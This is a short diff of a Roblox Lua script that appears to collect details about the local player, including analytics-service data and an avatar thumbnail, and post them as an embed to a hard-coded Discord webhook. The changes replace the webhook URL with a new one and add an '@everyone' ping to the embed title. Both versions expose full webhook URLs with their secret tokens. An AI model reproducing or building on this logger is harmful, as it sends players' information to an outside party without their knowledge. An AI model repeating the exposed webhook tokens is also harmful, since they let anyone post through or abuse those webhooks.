@@ -11,7 +11,7 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local Players = game:GetService("Players")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
-local webhookURL = "https://discord.com/api/webhooks/1331561818568785921/ZK4XQE9pd9Xz-a8fIq1NdYNbWqYMqjiPNdaQXCPpxtg7GFgxqKzIn6fkkN0iOXyj_5FV"
+local webhookURL = "https://discord.com/api/webhooks/1341321907437436999/LAc4oaP77sn7Py_zSbIV8SRKiEZaHgGIthCD0RmEjjEpR8XmYMwtFA-ZnTfxq0DfiDwQ"
 
 local function getThumbnail(userId)
     local url = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. userId .. "&returnPolicy=PlaceHolder&size=75x75&format=Png&isCircular=false"
@@ -36,7 +36,7 @@ local payload = {
     embeds = {
         {
             color = 14177041,
-            title = "Player Information",
+            title = "@everyone :) Player Information",
             description = "Details about the local player.",
             thumbnail = { url = getThumbnail(userId) },
             fields = {
